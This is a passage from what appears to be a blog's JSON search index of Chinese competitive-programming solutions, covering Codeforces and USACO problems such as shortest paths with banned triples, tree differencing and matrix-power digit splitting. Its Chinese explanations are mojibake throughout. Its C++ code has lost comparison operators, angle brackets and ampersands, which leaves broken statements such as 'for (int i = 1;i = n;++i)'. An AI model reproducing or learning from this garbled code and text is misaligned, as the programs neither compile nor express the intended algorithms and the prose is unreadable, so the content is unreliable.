n;++i) if (i == 1) ans[i] = easy_make (a[i]); else if (a[i] a[i - 1]) ans[i] = medium_make (ans[i - 1],a[i]); else ans[i] = hard_make (ans[i - 1],a[i]); for (int i = 1;i = n;++i) coutans[i]endl; return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;string easy_make (int x)//ç›´æ¥è´ªå¿ƒå¡«å…¥ string s = ; for (int i = 1;i = x / 9;++i) s += 9; x %= 9; if (x) s = char (x + 48) + s; return s;string medium_make (string la,int x) int len = la.size ();int sum = x; string s = ; for (int i = 0;i len;++i) sum -= la[i] - 0; for (int i = len - 1;~i;--i) if (!sum) s = la[i] + s; else s = char (la[i] + min (9 - (la[i] - 0),sum)) + s,sum -= min (9 - (la[i] - 0),sum);//å°½é‡å‡‘æˆ 9 return easy_make (sum) + s;string hard_make (string la,int x) int len = la.size (); for (int i = len - 1;~i;--i) if (la[i] != 9) string s = ;int sum = 0; for (int j = 0;j i;++j) s += la[j],sum += la[j] - 0; s += char (la[i] + 1);sum += la[i] - 0 + 1; if (x - sum 0) continue;//è¦åˆæ³•æ‰è¡Œ string nw = easy_make (x - sum); int p = len - s.size () - nw.size (); for (int j = 1;j = p;++j) s += 0;//è¡¥ 0 ä¿è¯ ans_i å•è°ƒé€’å¢ return s + nw; string s = 1;++len;//ç›´æ¥æ–°å¼€ä¸€ä½ string nw = easy_make (x - 1); int p = len - s.size () - nw.size (); for (int i = 1;i = p;++i) s += 0;//è¡¥ 0 ä¿è¯ ans_i å•è°ƒé€’å¢ return s + nw;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF59E Shortest Path","path":"/2023/05/08/CF59E/","content":"å¯¹äº $k$ å¯¹æœ‰åºçš„ä¸‰å…ƒç»„ $(x,y,z)$ ä¸ºä¸èƒ½èµ°çš„è·¯çº¿ã€‚æœ¬é¢˜å¯¹é€‰æ‹©æ°å½“çš„å·¥å…·å­˜å‚¨ä¸‰å…ƒç»„æœ‰ç€è¾ƒé«˜çš„è¦æ±‚ã€‚ é¦–å…ˆæƒ³åˆ°çš„æ˜¯ map ä¸ setï¼Œä»¤ set int ban[x][y] è®°å½•å½¢å¦‚ $x \\to y \\to z_i$ çš„æ‰€æœ‰ $z_i$ã€‚è¿›è¡Œå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼Œè®°å½•ä¸€ä¸ªç‚¹ $u$ çš„å‰é©± $p$ ç‚¹çš„åŒæ—¶éå†åç»§èŠ‚ç‚¹ $v$ï¼Œè‹¥ $(u,v,z)$ åˆæ³•ï¼Œå³ ban[x][y].find (z) == ban[x][y].end ()ï¼ŒåŒæ—¶è¯¥è·¯å¾„å¯ä»¥æ›´æ–°ï¼Œé‚£ä¹ˆåŠ å…¥é˜Ÿåˆ—ä¸­å»å¹¶è®°å½•ä¸‹å‰é©±èŠ‚ç‚¹ï¼ˆç”¨äºè·¯å¾„çš„è¾“å‡ºï¼‰ã€‚äºæ˜¯å¾—åˆ°äº†ä»¥ä¸‹æ ¸å¿ƒä»£ç ï¼š set int ban[MAX][MAX];void bfs () q.push (0,1); while (!q.empty ()) pair int,int x = q.front ();q.pop (); int p = x.first,u = x.second; if (u == n) printf (%d ,dis[p][u]); print (p,u); ok = 1;puts (); return ; for (auto v : ve[u]) if (ban[p][u].find (v) == ban[p][u].end () !dis[u][v]) pre[u][v] = p;dis[u][v] = dis[p][u] + 1; q.push (u,v); è™½ç„¶èƒ½è¿‡æ ·ä¾‹ï¼Œå¯æ˜¯â€¦â€¦ä¸€äº¤å‘ç° $\\texttt{MLE}$ã€‚ä»”ç»†ä¸€çœ‹ $k$ çš„èŒƒå›´ï¼Œç›´æ¥å¯„ã€‚äºæ˜¯å°è¯•ç”¨å“ˆå¸Œæ¥ä¼˜åŒ–ç©ºé—´ã€‚å¤§ä½“æ€è·¯ç›¸åŒï¼Œè€Œè¿™æ¬¡ç”¨ $xyz+x+y+z$ å¯¹å¤§è´¨æ•° $p$ çš„å€¼æ¥è¡¨ç¤º $(x,y,z)$ï¼Œè€ƒè™‘åˆ°é‡å¤ï¼Œç”¨ vector tri hsh[M] æ¥è®°å½•åŒä¸€ä¸ªå€¼çš„ä¸åŒä¸‰å…ƒç»„ï¼Œè¿™æ ·ç©ºé—´ä¾¿å¯å¤§å¤§é™ä½ï¼Œå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ä»£ç å¦‚ä¸‹: #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#include set#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3005;const int M = 999983;const int MOD = 1e9 + 7;inline int read ();struct tri int x,y,z;;int n,m,k,ok,dis[MAX][MAX],pre[MAX][MAX];vector int ve[MAX];vector tri hsh[M];queue pair int,int q;int get (int x,int y,int z);void add (int u,int v);bool check (int x,int y,int z);void bfs ();void print (int u,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read (); for (int i = 1;i = m;++i) int x = read (),y = read (); ve[x].push_back (y);ve[y].push_back (x); for (int i = 1;i = k;++i) int x = read (),y = read (),z = read (); hsh[get (x,y,z)].push_back ((tri)x,y,z); bfs (); if (!ok) puts (-1); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int get (int x,int y,int z)//è¿›è¡Œå“ˆå¸Œæ“ä½œ return (1ll * x * y * z % M + 1ll * x + 1ll * y + 1ll * z) % M;bool check (int x,int y,int z)//æ£€æµ‹æ˜¯å¦åˆæ³• for (auto tmp : hsh[get (x,y,z)]) if (tmp.x == x tmp.y == y tmp.z == z) return 1; return 0;void bfs () q.push (0,1); while (!q.empty ()) pair int,int x = q.front ();q.pop (); int p = x.first,u = x.second; if (u == n) printf (%d ,dis[p][u]);//è¾“å‡ºè·¯å¾„é•¿åº¦ print (p,u); ok = 1;puts (); return ; for (auto v : ve[u]) if (!check (p,u,v) !dis[u][v])//åˆæ³•ä¸”èƒ½è¿‡æ›´æ–° pre[u][v] = p;dis[u][v] = dis[p][u] + 1; q.push (u,v); void print (int u,int v)// é€’å½’è¾“å‡ºè·¯å¾„ if (!v) return ;//ç»ˆæ­¢æ¡ä»¶ print (pre[u][v],u); printf (%d ,v);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF575B Bribes","path":"/2023/01/26/CF575B/","content":"ç”±é¢˜å¯çŸ¥è¿™æ˜¯ä¸€æ£µæ ‘ï¼Œå› æ­¤æ±‚æ¯ä¸€æ¡è¾¹ç»è¿‡çš„æ¬¡æ•°å¯ä»¥é€šè¿‡æ ‘ä¸Šå·®åˆ†è§£å†³ã€‚è€Œç°åœ¨åªæœ‰éƒ¨åˆ†ï¼ˆæœ‰å‘ï¼‰è¾¹éœ€è¦èŠ±è´¹ï¼Œå› æ­¤å°±éœ€è¦æ‰¾åˆ°ä¸€ç§èƒ½å¤Ÿè®°å½•å•å‘èŠ±è´¹çš„ä¿¡æ¯ã€‚è€ƒè™‘åˆ°ä¸€æ¡è¾¹è¿æ¥çš„ä¸¤ä¸ªç‚¹å› åœ¨æ ‘ä¸Šè€Œæ·±åº¦ä¸åŒï¼Œæ‰€ä»¥å¯ä»¥åˆ†ä¸ºå¶å­æŒ‡å‘çˆ¶èŠ‚ç‚¹ä¸çˆ¶èŠ‚ç‚¹æŒ‡å‘å¶å­ä¸¤ç§è¾¹ã€‚å½¢è±¡åŒ–åœ°ï¼Œç¬¬ä¸€ç§å¯ä»¥ç§°ä¸ºä¸Šè¡Œè¾¹ï¼Œç¬¬äºŒç§ç§°ä¸ºä¸‹è¡Œè¾¹ã€‚ é¦–å…ˆé€šè¿‡æ ‘ä¸Šå·®åˆ†ï¼Œå°†ä¿¡æ¯åˆ†åˆ«å‚¨å­˜åœ¨ä¸Šè¡Œè¾¹çš„èµ·ç‚¹ä¸ä¸‹è¡Œè¾¹çš„ä¸­ç‚¹ã€‚ for (int i = 1;i = k;++i) int lca = getLCA (a[i],a[i - 1]); ++up[a[i - 1]];++down[a[i]];//up åŠ çš„ä½ç½®ä¸ºèµ·ç‚¹ï¼Œdown åŠ çš„ä½ç½®ä¸ºç»ˆç‚¹ --up[lca];--down[lca]; ç„¶åé€šè¿‡ä¸€æ¬¡ dfs å’Œå·®åˆ†æ•°ç»„è¿˜åŸæ¯ä¸€æ¡è¾¹ç»è¿‡çš„æ¬¡æ•°ã€‚æœ€åç»Ÿè®¡ç­”æ¡ˆï¼Œå¯¹äºä¸€æ¡ $v \\to u$ éœ€è¦èŠ±è´¹çš„è¾¹ï¼Œè‹¥æ˜¯ä¸Šè¡Œè¾¹ï¼Œé‚£ä¹ˆé€šè¿‡çš„æ¬¡æ•°è®°å½•åœ¨ $v$ ä¸Šï¼Œå¦åˆ™æ˜¯ $u$ ä¸Šã€‚è®¾æŸæ¡è¾¹ç»è¿‡äº† $x$ æ¬¡ï¼Œåˆ™æ€»èŠ±è´¹ä¸º $1 + 2 + \\cdots + 2^{x - 1} = 2^x - 1$ï¼Œæ‰€ä»¥ç›´æ¥é¢„å¤„ç† $2$ çš„å¹‚æ¬¡å³å¯ã€‚ æ€»ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#include map#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,k,a[MAX * 10],f[MAX][20],dep[MAX],up[MAX],down[MAX];vector int ve[MAX];map pair int,int,int co;ll ans,pw[MAX * 10];int getLCA (int x,int y);void dfs (int u,int fa);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i n;++i) int x = read (),y = read (),ty = read (); ve[x].push_back (y);co[x,y] = 0; ve[y].push_back (x);co[y,x] = ty; k = read (); for (int i = 1;i = k;++i) a[i] = read (); dfs (1,0); a[0] = pw[0] = 1; for (int i = 1;i = k;++i) pw[i] = pw[i - 1] * 2 % MOD; for (int i = 1;i = k;++i) int lca = getLCA (a[i],a[i - 1]); ++up[a[i - 1]];++down[a[i]];//up åŠ çš„ä½ç½®ä¸ºèµ·ç‚¹ï¼Œdown åŠ çš„ä½ç½®ä¸ºç»ˆç‚¹ --up[lca];--down[lca]; dfs (1,0); for (int u = 1;u = n;++u) for (auto v : ve[u]) // u - v æ—¶ä¸éœ€èŠ±è´¹ if (!co[v,u]) continue; //v - u æ—¶æ­¤æ—¶éœ€è¦èŠ±è´¹ if (dep[u] dep[v]) ans = (ans + pw[up[v]] - 1 + MOD) % MOD; else ans = (ans + pw[down[u]] - 1 + MOD) % MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void dfs (int u,int fa) f[u][0] = fa;dep[u] = dep[fa] + 1; for (int i = 1;i = 18;++i) f[u][i] = f[f[u][i - 1]][i - 1]; for (auto v : ve[u]) if (v == fa) continue; dfs (v,u); up[u] += up[v];down[u] += down[v];//ç¬¬äºŒæ¬¡ dfs æ—¶æ‰ç”¨åˆ° ï¼ˆé€šè¿‡å·®åˆ†æ•°ç»„è¿›è¡Œè¿˜åŸï¼‰ ç¬¬ä¸€æ¬¡ dfs æ—¶å€¼å‡ä¸º 0ï¼Œæ‰€ä»¥æ²¡æœ‰å½±å“ int getLCA (int x,int y) if (dep[x] dep[y]) swap (x,y); for (int i = 18;~i;--i) if (dep[f[x][i]] = dep[y]) x = f[x][i]; if (x == y) return x; for (int i = 18;~i;--i) if (f[x][i] != f[y][i]) x = f[x][i],y = f[y][i]; return f[x][0];","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP8901 [USACO22DEC] Circular Barn S","path":"/2022/12/20/P8901/","content":"å…ˆè€ƒè™‘ $N = 1$ çš„æƒ…å†µã€‚è‹¥å…ˆæ‰‹èƒœï¼Œæˆ‘ä»¬ç§° $a_i$ ä¸ºå¿…èƒœç‚¹ï¼Œå¦åˆ™ä¸ºå¿…è´¥ç‚¹ã€‚æ˜¾ç„¶ $1,2,3$ å‡ä¸ºå¿…èƒœç‚¹ï¼›è€Œ $4 = 1 + 3 = 2 + 2$ï¼Œæ— è®ºå¦‚ä½•éƒ½æ˜¯åæ‰‹èƒœï¼Œæ‰€ä»¥ä¸ºå¿…è´¥ç‚¹ã€‚å¦‚æœè¿™æ—¶å€™ä½ ä¸çŸ¥é“å¦‚ä½•å»åˆ†æï¼Œå¯ä»¥å°è¯•æ‰“å‡ºå¿…è´¥ç‚¹çš„è¡¨ï¼ˆçŒœæµ‹å¿…è´¥ç‚¹å¹¶ä¸å¤šï¼‰ï¼Œå¯¹äºä¸€ä¸ª $a_i$ è‹¥æ— æ³•æ‹†åˆ†æˆè´¨æ•°æˆ– $1$ ä¸å¦ä¸€ä¸ªæ¯”å®ƒå°çš„å¿…è´¥ç‚¹çš„å½¢å¼ï¼Œé‚£ä¹ˆè¿™ä¸ª $a_i$ ä¾¿æ˜¯å¿…è´¥ç‚¹ã€‚ //x ä¸ºå½“å‰éœ€è¦åˆ¤æ–­çš„æ•° p[1] = p[2] = p[3] = p[5] = p[7] = 1ï¼Œä»¥æ­¤ç±»æ¨ok = 0;for (auto i : lose) if (p[x - i]) ok = 1;//å¯ä»¥æ‹†åˆ†if (!ok) lose.push_back (i)//è¯´æ˜æ˜¯å¿…è´¥ç‚¹ é€šè¿‡æ‰“è¡¨å‘ç°å¿…è´¥ç‚¹éƒ½æ˜¯ $4$ çš„å€æ•°ã€‚å…¶å®è¿™å¾ˆå¥½ç†è§£ï¼Œç”±äº $4$ ä¸ºæœ€å°çš„å¿…è´¥ç‚¹ï¼Œé‚£ä¹ˆå¯¹äº $(4,8)$ çš„æ•°ï¼Œéƒ½å¯ä»¥é€šè¿‡ $4 + 1,4 + 2,4 + 3$ æ¥è¡¨ç¤ºï¼Œè€Œ $8$ åªèƒ½è¡¨ç¤ºæˆ $4$ åŠ ä¸Šä¸€ä¸ªè´¨æ•°ï¼Œæ˜¾ç„¶ä¸å­˜åœ¨ã€‚é‚£ä¹ˆä»¥æ­¤ç±»æ¨ï¼Œå¯çŸ¥å¿…è´¥ç‚¹ä¸º $4k(k \\in N^*)$ã€‚ ç°åœ¨å°†é—®é¢˜è¿˜åŸï¼Œå¯¹äºæŸä¸€æ ¼çš„æ•°ï¼Œå¦‚æœæ˜¯å¿…è´¥ç‚¹ï¼Œé‚£ä¹ˆå…ˆæ‰‹ä¼šå°½é‡æ‹–å»¶æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´é€‰æ‹©æ•°ä½¿å…¶èƒ½å¤Ÿç»è¿‡å°½å¯èƒ½å¤šçš„è½®æ•°ï¼›å¦åˆ™å°±ä¼šç”¨å°½å¯èƒ½å°‘çš„è½®æ•°ç»“æŸæ¥èµ¢å¾—æ¸¸æˆã€‚ç°åœ¨è¿›è¡Œåˆ†ç±»è®¨è®ºï¼š $a_i$ ä¸º $1$ æˆ–è´¨æ•°ï¼Œæ˜¾ç„¶ä¸€è½®å°±èƒ½ç»“æŸï¼› $a_i$ ä¸ºå¥‡æ•°ï¼Œä»ç¬¬ä¸€ä¸ªä¸å¤§äºå®ƒçš„è´¨æ•°ï¼ˆæˆ– $1$ï¼Œä¸‹åŒï¼‰å¼€å§‹åˆ¤æ–­ï¼Œæ‰¾åˆ°å°½å¯èƒ½å¤§çš„è´¨æ•°ç¬¦åˆè´¨æ•°åŠ ä¸Šå¿…è´¥ç‚¹çš„å½¢å¼ï¼› $a_i$ ä¸ºå¶æ•°ï¼Œæ— è®ºæ˜¯å¿…èƒœè¿˜æ˜¯å¿…è´¥ç‚¹ï¼Œæ¯æ¬¡éƒ½åªä¼šå– $2$ã€‚ä¸‹é¢ç»™å‡ºè¯æ˜ï¼š $a_i$ ä¸ºå¿…è´¥ç‚¹ï¼Œå…ˆæ‰‹ä¼šå°½é‡æ‹–å»¶æ—¶é—´ï¼Œå–çš„æ•°å°½å¯èƒ½å°ï¼Œä¸éš¾å‘ç°å– $2$ ä¼šæ¯”å– $1$ ä¼˜ã€‚ $a_i$ ä¸ºå¿…èƒœç‚¹ï¼Œç”±äºå¿…è´¥ç‚¹ä¸ºå¶æ•°ï¼Œæ‰€ä»¥åªèƒ½å– $2$ è¿™ä¸€ä¸ªå”¯ä¸€çš„å¶è´¨æ•°ã€‚ è‡³æ­¤ï¼Œå–æ•°çš„ç­–ç•¥å·²ç»è®²è§£å®Œæ¯•ã€‚æ‰€ä»¥åªè¦æ‰¾åˆ°è‹¥å¹²è½®åæœ€å…ˆç»“æŸçš„ $a_i$ï¼Œåˆ¤æ–­å…¶æ˜¯å¿…èƒœç‚¹è¿˜æ˜¯å¿…è´¥ç‚¹å³å¯ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5,M = 5e6 + 500;const int MOD = 1e9 + 7;inline int read ();int t,n,ok,times,cnt,a[MAX],vis[M + 5],p[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); for (int i = 2;i = M;++i) if (!vis[i]) p[++cnt] = i; for (int j = 1;j = cnt;++j) if (i * p[j] M) break; vis[i * p[j]] = 1; if (i % p[j] == 0) break; p[0] = 1; t = read (); while (t--) n = read (); ok = 1;times = INF; for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (a[i] % 2 == 0 times a[i] / 4) ok = (a[i] % 4 != 0),times = a[i] / 4; if (a[i] 1) int x = upper_bound (p,p + 1 + cnt,a[i]) - p - 1; while (~x) if ((a[i] - p[x]) % 4 == 0) if (times (a[i] - p[x]) / 4) ok = 1,times = (a[i] - p[x]) / 4; break; --x; puts (ok ? Farmer John : Farmer Nhoj); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP3176 [HAOI2015]æ•°å­—ä¸²æ‹†åˆ†","path":"/2022/11/18/P3176/","content":"å…ˆå¤„ç†å‡½æ•° $f_i$ï¼Œæœ‰ $f_i = \\sum \\limits _{j = i - m}^{i - 1} f_j$ï¼Œè¿™ä¸ªé€’æ¨å¼æ˜¾ç„¶å¯ä»¥é€šè¿‡çŸ©é˜µä¹˜æ³•è¿›è¡Œä¼˜åŒ–ã€‚è®¾ $F_i$ è¡¨ç¤ºé€šè¿‡é€’æ¨å‡½æ•° $f_i$ å¾—åˆ°çš„çŸ©é˜µï¼Œåˆ™æœ‰ä»¥ä¸‹çŸ©é˜µçš„é€’æ¨ï¼ˆä»¥ $m = 5$ ä¸ºä¾‹ï¼‰ï¼š F_i = \\begin{bmatrix} f_i\\\\ f_{i - 1}\\\\ f_{i - 2}\\\\ f_{i - 3}\\\\ f_{i -4} \\end {bmatrix} = \\begin{bmatrix} 1 & 1 & 1 & 1 & 1\\\\ 1 & 0 & 0 & 0 & 0\\\\ 0 & 1 & 0 & 0 & 0\\\\ 0 & 0 & 1 & 0 & 0\\\\ 0 & 0 & 0 & 1 & 0 \\end {bmatrix}^k \\cdot \\begin{bmatrix} f_{i - 1}\\\\ f_{i - 2}\\\\ f_{i - 3}\\\\ f_{i - 4}\\\\ f_{i - 5} \\end{bmatrix}$g_i$ çš„è®¡ç®—ä¸å¤ªå¥½å¤„ç†ï¼Œç­‰ä»·è½¬æ¢ä»¥ä¸‹ä»¤ $G_i$ è¡¨ç¤ºå¤„ç†å‰ $i$ ä½å¾—åˆ°çš„æ‰€æœ‰æƒ…å†µçš„çŸ©é˜µä¹‹å’Œï¼Œå› æ­¤æœ€åçš„ç­”æ¡ˆå°±ä¼šåœ¨ $G_n$ ä¸­ã€‚ç”±çŸ©é˜µçš„ä¹˜æ³•åˆ†é…å¾‹å¯çŸ¥ $A^{x + y} = A^x \\times A^y$ï¼Œå› æ­¤å¯ä»¥å°† $G_i$ è¿›è¡Œè½¬ç§»ã€‚è®¾ $A_{i,j}$ è¡¨ç¤ºæ•°å­—ä¸²ä¸­ $[i,j]$ çš„è½¬ç§»çŸ©é˜µä¹‹ç§¯ï¼Œåˆ™ $G_i = \\sum \\limits _{j = 0}^{i - 1} G_j \\times A_{j + 1,i}$ã€‚ ç°åœ¨çš„å¤æ‚åº¦ä¸ºè®¡ç®—çŸ©é˜µ $A_{i,j}$ï¼Œä¸éš¾å‘ç° $A_{i,j} = F_{s_i^{10^{n - i}}} \\times A_{i + 1,j}$ï¼Œç¨ä½œå˜æ¢å¾— $A_{i,j} = F_{({10^{n - i}})^{s_i}} \\times A_{i + 1,j}$ã€‚è¿™æ ·åªéœ€è¦é¢„å¤„ç†å‡º $F_{10^i}$ çš„çŸ©é˜µå³å¯ã€‚ ä¸¤ä¸ªå°ç»†èŠ‚ï¼š åœ¨å†™çŸ©é˜µæ—¶ç”¨åˆ°äº† + ä¸ * çš„é‡è½½ï¼Œè¿™æ—¶å€™åŸæ¥çš„ä¼˜å…ˆçº§å·²ç»ä¸å¤å­˜åœ¨ï¼Œå› æ­¤éœ€è¦é€šè¿‡æ‹¬å·æ¥å¤„ç†é¡ºåºã€‚ çŸ©é˜µçš„åˆå§‹åŒ–è¦å°å¿ƒï¼Œéœ€è¦é¿å…æœªå®šä¹‰è¡Œä¸ºã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 505;const int MOD = 998244353;int m,n;ll ans;char s[MAX]; struct Mat ll a[6][6]; Mat() memset(a,0,sizeof(a));//å…¨éƒ¨ memset è‚¯å®šæ²¡é—®é¢˜ Mat operator * (const Mat y) Mat z; for (int k = 1;k = m;++k) for (int i = 1;i = m;++i) for (int j = 1;j = m;++j) z.a[i][j] += a[i][k] * y.a[k][j] % MOD,z.a[i][j] %= MOD; return z; Mat operator + (const Mat y) Mat z; for (int i = 1;i = m;++i) for (int j = 1;j = m;++j) z.a[i][j] = a[i][j] + y.a[i][j],z.a[i][j] %= MOD; return z; Mat qpow (Mat x,ll y) Mat res; for (int i = 1;i = m;++i) res.a[i][i] = 1; while (y) if (y 1) res = res * x; x = x * x; y = 1; return res; p[MAX],f[MAX][MAX],g[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%s%d,s + 1,m); n = strlen (s + 1); for (int i = 1;i = m;++i) p[0].a[1][i] = 1; for (int i = 2;i = m;++i) p[0].a[i][i - 1] = 1; for (int i = 1;i = n;++i) p[i] = p[i].qpow (p[i - 1],10);//é¢„å¤„ç† 10^i çš„çŸ©é˜µ for (int j = 1;j = n;++j)//æ‰©å±• éœ€è¦æ³¨æ„ä¸€ä¸‹ i = j çš„ç‰¹æ®Šæƒ…å†µ for (int i = j;i;--i)//f[i][j] = f[i + 1][j] * f(10^(j - i))^(s_i) f[i][j] = (i == j) ? f[i][j].qpow (p[0],s[i] - 0) : f[i + 1][j] * f[i][j].qpow (p[j - i],s[i] - 0); for (int i = 1;i = m;++i) g[0].a[i][i] = 1; for (int i = 1;i = n;++i)//g[i] è¡¨ç¤ºå‰ i ä½çš„æ‰€æœ‰æƒ…å†µçš„ç­”æ¡ˆ for (int j = 0;j i;++j) g[i] = g[i] + (g[j] * f[j + 1][i]);//æ³¨æ„ä¼˜å…ˆçº§ printf (%lld ,g[n].a[1][1]);//æœ€åçš„ç­”æ¡ˆæ˜¾ç„¶æ˜¯å·¦ä¸Šè§’çš„é‚£ä¸ªå€¼ return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1650F Vitaly and Advanced Useless Algorithms","path":"/2022/11/17/CF1650F/","content":"æœ‰ä¸€ä¸ªæ˜¾ç„¶çš„è´ªå¿ƒç»“è®ºï¼Œå°±æ˜¯å…ˆå®Œæˆä»»åŠ¡æˆªæ­¢æ—¶é—´è€ƒå‰çš„ï¼Œè‹¥åœ¨å‰é¢çš„éƒ½æ— æ³•å®Œæˆï¼Œé‚£ä¹ˆåé¢çš„æ›´åŠ ä¸å¯èƒ½å®Œæˆã€‚é¢˜ç›®ååˆ†è‰¯å¿ƒï¼Œ$a_i$ å·²ç»åœ¨è¾“å…¥æ—¶å‡åºç»™å‡ºã€‚ å¯¹äºæ¯ä¸ªä»»åŠ¡ï¼Œéœ€è¦ç”¨å°½å¯èƒ½å°‘åœ°è€—æ—¶å®Œæˆå°½å¯èƒ½å¤šçš„ç™¾åˆ†æ¯”ï¼Œæ¯ä¸ªè®¡åˆ’çš„çŠ¶æ€å‡ä¸ºé€‰æˆ–ä¸é€‰ï¼Œè¿™ä¸å°±æ˜¯ $0-1$ èƒŒåŒ…å˜›ã€‚ç”±äºè¦è¾“å‡ºæ–¹æ¡ˆï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾äºŒç»´çŠ¶æ€ï¼Œå¯¹äºæŸä¸ªä»»åŠ¡ï¼Œè®¾ $dp_{i,j}$ è¡¨ç¤ºè¯¥ä»»åŠ¡çš„å‰ $i$ ä¸ªè®¡åˆ’å®Œæˆçš„ç™¾åˆ†ç‡ä¸º $j$ æ—¶çš„æœ€å°è€—æ—¶ï¼Œè¿™é‡Œé»˜è®¤ $j 100$ æ—¶ä¹Ÿè¡¨ç¤ºæˆ $j = 100$ çš„çŠ¶æ€ã€‚æ‰€ä»¥å¯ä»¥å†™æˆæ–¹ç¨‹ $dp_{i,j}(j \\le [1,100]) = \\min (dp_{i - 1,j},\\min \\{dp_{i - 1,j - p} + t\\})$ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯ç»§æ‰¿ä¸Šä¸€æ¬¡çš„çŠ¶æ€ã€‚ å¯¹äºæ¯ä¸ªä»»åŠ¡çš„æ–¹æ¡ˆè®°å½•ï¼Œç›´æ¥ä» $dp_{i,100}$ è¿›è¡Œè¿˜åŸï¼Œè‹¥ $dp_{i,j} â‰  dp_{i - 1,j}$ åˆ™è¯´æ˜å‘ç”Ÿæœ‰æ•ˆè½¬ç§»ï¼Œè®°å½•æ­¤æ—¶çš„è®¡åˆ’ç¼–å·å³å¯ã€‚ç”¨ä¸€ä¸ª vector å»è®°å½•ä¼šæ¯”è¾ƒéå†ï¼Œæ¯ä¸€æ¬¡ $dp$ åå°†æ¯ä¸ªäººç‰©çš„æ–¹æ¡ˆæ±‡æ€»è‡³æ€»çš„æ–¹æ¡ˆæ•°ç»„å³å¯ã€‚ æ€è·¯ä¸ç®—å¤æ‚ï¼Œä¸è¿‡éœ€è¦æ³¨æ„ $dp$ï¼Œæ–¹æ¡ˆè®°å½•æ•°ç»„çš„åˆå§‹åŒ–ä»¥åŠæ— è§£çš„åˆ¤æ–­ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int id,t,p;;int t,n,m,ok,sum,a[MAX],dp[MAX][105];vector int ans,v;vector node e[MAX];int solve (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();m = read ();ok = 1;sum = 0;ans.clear (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = m;++i) int x = read (),ti = read (),pi = read (); e[x].push_back (i,ti,pi); for (int i = 1;i = n;++i) int x = solve (i); if (x == -1 || sum + x a[i])ok = 0;break;//æ—¶é—´ä¸å¤Ÿ sum += x; for (auto j : v) ans.push_back (j);//ç­”æ¡ˆçš„æ±‡æ€» if (!ok) puts (-1); else printf (%d ,ans.size ()); for (auto i : ans) printf (%d ,i); puts (); for (int i = 1;i = n;++i) e[i].clear (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int solve (int x) int k = e[x].size (); for (int i = 0;i = k;++i) for (int j = 0;j = 100;++j) dp[i][j] = INF; v.clear (); dp[0][0] = 0;//åˆå§‹åŒ– for (int i = 1;i = k;++i) node nw = e[x][i - 1];//æ³¨æ„ vector çš„ä¸‹æ ‡å­˜å‚¨ for (int j = 100;~j;--j) dp[i][j] = min (dp[i][j],dp[i - 1][max (0,j - nw.p)] + nw.t),dp[i][j] = min (dp[i - 1][j],dp[i][j]); if (dp[k][100] == INF) return -1;//æ— æ³•å®Œæˆä»»åŠ¡ int p = k,cnt = 100; while (p cnt 0) if (dp[p][cnt] == dp[p - 1][cnt]) --p;continue;//è¯´æ˜å¹¶æ²¡æœ‰å‘ç”Ÿæœ‰æ•ˆè½¬ç§» v.push_back (e[x][p - 1].id);//è®°å½•ç¼–å· cnt -= e[x][p - 1].p; --p; return dp[k][100];//æœ€å°æ—¶é—´","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1749F Distance to the 